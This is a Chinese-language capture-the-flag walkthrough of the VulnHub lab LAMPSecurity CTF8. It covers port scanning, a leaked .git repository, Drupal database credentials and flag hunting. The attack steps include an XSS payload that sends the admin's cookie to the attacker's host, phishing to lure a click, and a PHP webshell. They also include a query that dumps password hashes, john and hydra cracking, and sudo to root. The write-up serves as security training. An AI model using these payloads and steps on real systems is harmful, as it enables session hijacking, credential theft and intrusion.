[靶机地址](https://www.vulnhub.com/entry/lampsecurity-ctf8,87/)

**环境配置**
有vmx 自动配置好了的

**靶机ip**:192.168.136.164

信息收集
nmap:
```
Starting Nmap 7.91 ( https://nmap.org ) at 2024-05-09 04:09 CST
Nmap scan report for 192.168.136.164
Host is up (0.0020s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0            4096 Jun 05  2013 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.136.146
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 2.0.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 5e:ca:64:f0:7f:d2:1a:a2:86:c6:1f:c2:2a:b3:6b:27 (DSA)
|_  2048 a3:39:2d:9f:66:96:0d:82:ad:52:1f:a1:dc:b1:f1:54 (RSA)
25/tcp   open  smtp        Sendmail
| smtp-commands: localhost.localdomain Hello [192.168.136.146], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP, 
|_ 2.0.0 This is sendmail 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation see 2.0.0 http://www.sendmail.org/email-addresses.html 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info 
80/tcp   open  http        Apache httpd 2.2.3 ((CentOS))
|_http-favicon: Drupal CMS
| http-git: 
|   192.168.136.164:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: initial commit 
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /sites/ /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /install.php /INSTALL.txt /LICENSE.txt 
|_/MAINTAINERS.txt
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: LAMPSecurity Research
110/tcp  open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) PIPELINING STLS USER UIDL RESP-CODES CAPA TOP
| ssl-cert: Subject: commonName=imap.example.com
| Not valid before: 2013-05-29T19:38:44
|_Not valid after:  2014-05-29T19:38:44
|_ssl-date: 2024-05-08T20:09:32+00:00; 0s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            918/udp   status
|_  100024  1            921/tcp   status
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open  imap        Dovecot imapd
|_imap-capabilities: Capability completed THREAD=REFERENCES OK LOGIN-REFERRALS LITERAL+ AUTH=PLAINA0001 UNSELECT STARTTLS SORT MULTIAPPEND NAMESPACE IDLE CHILDREN IMAP4rev1 SASL-IR
|_ssl-date: 2024-05-08T20:09:32+00:00; 0s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
443/tcp  open  ssl/http    Apache httpd 2.2.3 ((CentOS))
| http-git: 
|   192.168.136.164:443/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: initial commit 
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /sites/ /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /install.php /INSTALL.txt /LICENSE.txt 
|_/MAINTAINERS.txt
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: LAMPSecurity Research
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2013-05-29T19:38:35
|_Not valid after:  2014-05-29T19:38:35
|_ssl-date: 2024-05-08T20:09:32+00:00; 0s from scanner time.
445/tcp  open  netbios-ssn Samba smbd 3.0.33-3.7.el5 (workgroup: WORKGROUP)
993/tcp  open  ssl/imap    Dovecot imapd
| ssl-cert: Subject: commonName=imap.example.com
| Not valid before: 2013-05-29T19:38:44
|_Not valid after:  2014-05-29T19:38:44
|_ssl-date: 2024-05-08T20:09:32+00:00; 0s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
995/tcp  open  ssl/pop3    Dovecot pop3d
|_pop3-capabilities: PIPELINING SASL(PLAIN) USER UIDL RESP-CODES CAPA TOP
| ssl-cert: Subject: commonName=imap.example.com
| Not valid before: 2013-05-29T19:38:44
|_Not valid after:  2014-05-29T19:38:44
|_ssl-date: 2024-05-08T20:09:32+00:00; 0s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
3306/tcp open  mysql       MySQL (unauthorized)
5801/tcp open  vnc-http    RealVNC 4.0 (resolution: 400x250; VNC TCP port: 5901)
|_http-server-header: RealVNC/4.0
|_http-title: VNC viewer for Java
5802/tcp open  vnc-http    RealVNC 4.0 (resolution: 400x250; VNC TCP port: 5902)
|_http-server-header: RealVNC/4.0
|_http-title: VNC viewer for Java
5901/tcp open  vnc         VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|_    VNC Authentication (2)
5902/tcp open  vnc         VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|_    VNC Authentication (2)
5903/tcp open  vnc         VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|_    VNC Authentication (2)
5904/tcp open  vnc         VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|_    VNC Authentication (2)
6001/tcp open  X11         (access denied)
6002/tcp open  X11         (access denied)
6003/tcp open  X11         (access denied)
6004/tcp open  X11         (access denied)
MAC Address: 00:0C:29:B6:CE:D0 (VMware)
Service Info: OS: Unix

Host script results:
|_clock-skew: mean: 34m17s, deviation: 1h30m42s, median: 0s
|_nbstat: NetBIOS name: LAMPSEC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.33-3.7.el5)
|   Computer name: localhost
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: localhost.localdomain
|_  System time: 2024-05-08T16:09:20-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.13 seconds

```

扫出好多...

然后再用新学到的姿势 `nikto -h xxx`扫一扫
也能扫出很多 主要是深度递归扫描 选择性参考


还是先打web端
源码找到flag1

评论处有xss 但tm离线靶机xss没用,...
phpinfo.php是直接泄露了的 flag2
`550e1bafe077ff0b0b67f4e32f29d751 `

还有.git泄露 翻了翻也没找到突破口

那就看给的网页吧 前面尝试了xss 还有个登录/注册
其余的没看出有啥用... 注册登录后也找不到一些能利用的点...
找到个 Administer的选项 需要admin身份

然后翻看recent post (/track) 发现大量帖子都是`Barbara`发的
在第二个帖子(hidden)找到 flag3 `57dbe55b42b307fb4115146d239955d0`

在/robots.txt 找到flag4 `4db00563d4181dc8d1dfd3b5cd6dc708`

然后看了看wp 要get源码(这靶机奇奇怪怪的... 点分的太杂了吧...)
直接GitHack dump源码

这种难度的靶机肯定不是让我们代码审计自己写exp :(
重点关注一些配置文件 找用户名 密码之类的

找drupal的站点配置文件
`/sites/default/default.settings.php`
`/sites/default/settings.php`

对比
`$db_url = 'mysql://username:password@localhost/databasename';`
`$db_url = 'mysqli://root:JumpUpAndDown@localhost/drupal';`

得到username:root   password:JumpUpAndDown

尝试mysql连接连不上...


回到先前找到的xss漏洞
结合我们的猜测: Barbara应该是管理员 我们向ta私信来获得ta的cookie
把cookie带到vps上

```
<script>document.write('<img src="http://192.168.136.146:9999/'+document.cookie+'"/>')</script>
```

![img](ctf8/images/image.png)
然后用社工钓鱼的方法来让ta点击
就类似这种
![img](ctf8/images/image-1.png)

隔一会儿就能得到Barbara的cookie了
![img](ctf8/images/image-2.png)

woc 社工钓鱼 学到了 orz
然后带上Barbara的cookie访问/admin 成功
![img](ctf8/images/image-3.png)

然后发现Barbara可以create content
在下面可以选择以phpcode的形式
写一个webshell 蚁剑连
然而发现这个shell没啥用 ls都没有

看wp... 查询drupal的数据库...

```php
<?php
$result = db_query('sql');
while($test = db_fetch_object($result))
{
print $test->name . ":" . $test->pass . "<br/>";
}
```

```php
<?php
$result = db_query('select name,pass from users');
while($test = db_fetch_object($result))
{
print $test->name . ":" . $test->pass . "<br/>";
}
?>
```

得到
```
admin:49265c16d1dff8acef3499bd889299d6
Barbara:bed128365216c019988915ed3add75fb
Jim:2a5de0f53b1317f7e36afcdb6b5202a4
Steve:08d15a4aef553492d8971cdd5198f314
Sherry:c3319d1016a802db86653bcfab871f4f
Gene:9b9e4bbd988954028a44710a50982576
Harvey:7d29975b78825ea7c27f5c0281ea2fa4
John:518462cd3292a67c755521c1fb50c909
Johnathan:6dc523ebd2379d96cc0af32e2d224db0
Susan:0d42223010b69cab86634bc359ed870b
Dan:8f75ad3f04fc42f07c95e2f3d0ec3503
George:ed2b1f468c5f915f3f1cf75d7068baae
Jeff:ca594f739e257245f2be69eb546c1c04
Stacey:85aca385eb555fb6a36a62915ddd8bc7
Juan:573152cc51de19df50e90b0e557db7fe
Michael:c7a4476fc64b75ead800da9ea2b7d072
Jerome:42248d4cb640a3fb5836571e254aee2b
Tom:971dcf53e88e9268714d9d504753d347
Xavier:3005d829eb819341357bfddf541c175b
Sally:7a1c07ff60f9c07ffe8da34ecbf4edc2
test1:b7dfe9134c7a717a3b6eaf37bdc1ef7b
```

john爆破
用rockyou字典爆
`john --wordlist=rockyou.txt -form=raw-md5 user.txt`

秒出
```
Using default input encoding: UTF-8
Loaded 21 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
cherry           (Michael)
fantasy          (Sally)
12341234         (George)
passw0rd         (Barbara)
football123      (admin)
swanson          (Juan)
letmein!         (Jim)
thundercats      (Xavier)
123456!          (test1)
BobMarley        (Susan)
1website         (Sherry)
11g 0:00:00:00 DONE (2024-05-09 05:37) 12.22g/s 15937Kp/s 15937Kc/s 162468KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

然后就是这么多账密怎么用...
再登drupal界面就没啥用了
常规思路是登ssh
用hydra爆破一下ssh
`hydra 目标IP 协议 -l （用户名，-L用户名字典） -P（密码字典，p直接是密码）-V（过程）`

`hydra ssh://192.168.136.164/ -L user.txt -P pass.txt -V`

然而直接爆没爆出来

接下来就是脑洞大开...
![img](ctf8/images/image-4.png)

emmm... Dio...楽
所以以 bdio用户名连ssh

这里注意 OpenSSH版本不支持 DSA算法
![img](ctf8/images/image-5.png)

换方式
`ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss bdio@192.168.136.164`
密码: passw0rd

![img](ctf8/images/image-6.png)

但没权限 所以尝试换admin账密 但这个admin的真实名字是`spinkton`

用spinkton登ssh
`ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss spinkton@192.168.136.164`
密码: football123
在目录下找到flag
![img](ctf8/images/image-7.png)

尝试 `sudo su`提权
直接提权成功
![img](ctf8/images/image-8.png)
在/root找到最后一个flag
...

---
---

总结:
这靶机太tm杂了吧... 信息收集不了一点...
嘛 倒也学了学社工钓鱼~ 还是不错的~ XSS外带也尝试成功~
(果然XSS还是学的不好 但这靶机其实我想到XSS带cookie但确实没注意到Barbara... 甚至还要钓鱼诱导点击2333)
